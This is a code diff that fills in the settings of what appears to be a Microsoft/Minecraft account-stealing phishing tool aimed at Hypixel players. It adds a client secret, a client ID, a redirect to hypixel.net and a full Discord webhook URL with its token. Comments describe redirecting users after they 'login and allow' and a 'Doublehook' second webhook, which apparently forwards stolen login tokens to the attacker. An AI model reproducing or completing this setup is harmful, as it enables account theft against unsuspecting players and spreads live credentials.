@@ -1,8 +1,8 @@
 //Change these
-const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = ''
-const redirect_uri = ''
-const webhook_url = ''
+const client_secret = '4a36b0c2-3968-4c90-a8c5-1a1643d18717' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'a69a3ed9-c3e5-415e-94c9-051a3f9f1ea5'
+const redirect_uri = 'hypixel.net'
+const webhook_url = 'https://discord.com/api/webhooks/1110447742175682632/riMT26ZAus4kR3LLyNl4I4IYzE8cIOShqmO8BgK223NaABe9CAzlMNCs1icCqq3ArQ1n'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = false //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 const dh = '' //Doublehook, put your webhook here
